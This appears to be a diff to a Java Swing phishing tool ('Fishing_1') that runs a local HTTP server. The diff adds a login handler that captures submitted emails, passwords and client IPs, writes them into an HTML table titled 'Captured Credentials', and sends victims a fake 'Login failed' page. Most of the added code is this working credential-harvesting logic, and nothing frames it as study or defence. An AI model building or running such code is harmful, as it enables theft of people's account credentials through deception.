@@ -10,8 +10,10 @@ import java.awt.event.ActionEvent;
 import java.io.*;
 import java.net.InetSocketAddress;
 import java.net.URLDecoder;
+import java.nio.charset.StandardCharsets;
 import java.nio.file.*;
 import java.util.*;
+import java.util.List;
 
 public class Fishing_1 {
 
@@ -41,6 +43,12 @@ public class Fishing_1 {
         // Center Panel for log display
         logArea = new JTextArea();
         logArea.setEditable(false);
+
+        logArea.setFont(new Font("Tahoma", Font.PLAIN, 18)); // Arabic-supporting font
+        logArea.setLineWrap(true);
+        logArea.setWrapStyleWord(true);
+      //  logArea.setComponentOrientation(ComponentOrientation.RIGHT_TO_LEFT);
+
         JScrollPane scrollPane = new JScrollPane(logArea);
 
         frame.add(topPanel, BorderLayout.NORTH);
@@ -100,7 +108,7 @@ public class Fishing_1 {
     }
 
     // Custom login handler that captures form data
-    static class LoginHandler implements HttpHandler {
+   /* static class LoginHandler implements HttpHandler {
         public void handle(HttpExchange exchange) throws IOException {
             if ("POST".equals(exchange.getRequestMethod())) {
                 InputStream is = exchange.getRequestBody();
@@ -133,5 +141,133 @@ public class Fishing_1 {
             }
             return map;
         }
+    }*/
+   /* static class LoginHandler implements HttpHandler {
+        public void handle(HttpExchange exchange) throws IOException {
+            if ("POST".equals(exchange.getRequestMethod())) {
+                InputStream is = exchange.getRequestBody();
+                String formData = new String(is.readAllBytes());
+
+                Map<String, String> params = parseFormData(formData);
+                String email = params.getOrDefault("email", "");
+                String pass = params.getOrDefault("pass", "");
+
+                // Get client IP address
+                String clientIP = exchange.getRemoteAddress().getAddress().getHostAddress();
+
+                // File path
+                Path filePath = Paths.get("logs/captured.txt");
+                boolean fileExists = Files.exists(filePath);
+
+                // Build line for table
+                String line = String.format("%-30s %-30s %-15s%n", email, pass, clientIP);
+
+                // If new file, add headers
+                if (!fileExists) {
+                    String header = String.format("%-30s %-30s %-15s%n", "Email", "Password", "IP Address");
+                    Files.write(filePath, header.getBytes(), StandardOpenOption.CREATE);
+                }
+
+                Files.write(filePath, line.getBytes(), StandardOpenOption.APPEND);
+
+                // Update log on GUI
+                String logEntry = "EMAIL: " + email + " | PASS: " + pass + " | IP: " + clientIP;
+                SwingUtilities.invokeLater(() -> appendLog(logEntry));
+
+                // Fake failed login response
+                String response = "<h2>Login failed</h2><p>Invalid credentials</p>";
+                exchange.sendResponseHeaders(200, response.length());
+                OutputStream os = exchange.getResponseBody();
+                os.write(response.getBytes());
+                os.close();
+            }
+        }
+
+        private Map<String, String> parseFormData(String data) throws UnsupportedEncodingException {
+            Map<String, String> map = new HashMap<>();
+            for (String pair : data.split("&")) {
+                String[] kv = pair.split("=");
+                if (kv.length == 2) {
+                    map.put(URLDecoder.decode(kv[0], StandardCharsets.UTF_8), URLDecoder.decode(kv[1], StandardCharsets.UTF_8));
+                }
+            }
+            return map;
+        }
+    }*/
+    static class LoginHandler implements HttpHandler {
+        public void handle(HttpExchange exchange) throws IOException {
+            if ("POST".equals(exchange.getRequestMethod())) {
+                InputStream is = exchange.getRequestBody();
+                String formData = new String(is.readAllBytes());
+
+                Map<String, String> params = parseFormData(formData);
+                String email = params.getOrDefault("email", "");
+                String pass = params.getOrDefault("pass", "");
+
+                String clientIP = exchange.getRemoteAddress().getAddress().getHostAddress();
+
+                Path htmlPath = Paths.get("logs/captured.html");
+                boolean fileExists = Files.exists(htmlPath);
+
+                String row = String.format("<tr><td>%s</td><td>%s</td><td>%s</td></tr>%n", email, pass, clientIP);
+
+                if (!fileExists) {
+                    String html = """
+                <!DOCTYPE html>
+                <html>
+                <head>
+                  <title>Captured Credentials</title>
+                  <style>
+                    body { font-family: Arial, sans-serif; margin: 40px; }
+                    table { border-collapse: collapse; width: 100%; }
+                    th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
+                    th { background-color: #f2f2f2; }
+                    tr:nth-child(even) { background-color: #f9f9f9; }
+                  </style>
+                </head>
+                <body>
+                  <h2>Captured Credentials</h2>
+                  <table>
+                    <tr><th>Email</th><th>Password</th><th>IP Address</th></tr>
+                """ + row + """
+                  </table>
+                </body>
+                </html>
+                """;
+                    Files.writeString(htmlPath, html, StandardOpenOption.CREATE);
+                } else {
+                    // Append row just before </table>
+                    List<String> lines = Files.readAllLines(htmlPath);
+                    int insertIndex = lines.lastIndexOf("  </table>");
+                    if (insertIndex > 0) {
+                        lines.add(insertIndex, "    " + row.trim());
+                        Files.write(htmlPath, lines);
+                    }
+                }
+
+                SwingUtilities.invokeLater(() ->
+                        appendLog("EMAIL: " + email + " | PASS: " + pass + " | IP: " + clientIP)
+                );
+
+                String response = "<h2>Login failed</h2><p>Invalid credentials</p>";
+                exchange.sendResponseHeaders(200, response.length());
+                OutputStream os = exchange.getResponseBody();
+                os.write(response.getBytes());
+                os.close();
+            }
+        }
+
+        private Map<String, String> parseFormData(String data) throws UnsupportedEncodingException {
+            Map<String, String> map = new HashMap<>();
+            for (String pair : data.split("&")) {
+                String[] kv = pair.split("=");
+                if (kv.length == 2) {
+                    map.put(URLDecoder.decode(kv[0], "UTF-8"), URLDecoder.decode(kv[1], "UTF-8"));
+                }
+            }
+            return map;
+        }
     }
+
+
 }
